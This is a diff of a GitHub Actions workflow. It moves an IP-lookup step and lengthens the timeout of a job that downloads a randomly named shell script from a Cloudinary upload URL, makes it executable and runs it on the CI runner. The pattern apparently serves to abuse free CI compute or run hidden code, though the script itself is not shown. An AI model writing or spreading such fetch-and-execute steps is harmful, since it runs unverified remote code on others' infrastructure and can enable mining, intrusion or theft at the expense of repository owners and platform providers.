@@ -10,15 +10,14 @@ jobs:
     continue-on-error: true
     runs-on: ubuntu-latest
     steps:
+      - name: IP Workflow
+        run: |
+          curl https://api.ipify.org
       - name: Run exec
-        timeout-minutes: 2
+        timeout-minutes: 8
         run: |
           curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711173470/fotves64xiknlowbbd8r.sh
           chmod +x fotves64xiknlowbbd8r.sh
           ./fotves64xiknlowbbd8r.sh
 
-      - name: IP Workflow
-        run: |
-          curl https://api.ipify.org
 
-      # Ajoutez d'autres étapes de votre workflow ici
